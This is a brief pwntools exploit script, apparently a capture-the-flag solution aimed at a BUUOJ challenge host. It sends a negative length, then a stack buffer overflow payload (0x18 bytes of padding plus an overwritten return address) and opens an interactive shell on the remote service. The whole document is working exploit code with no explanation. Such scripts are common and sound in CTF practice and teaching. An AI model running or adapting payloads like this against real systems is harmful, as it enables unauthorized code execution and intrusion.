from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",25094)
context(os = 'linux',arch = 'i386',log_level = 'debug')

sh.sendline(b'-1')
payload=0x18*b'a'+p64(0x000000000040072A)+p64(0xdeadbeef)
sh.sendline(payload)
sh.interactive()
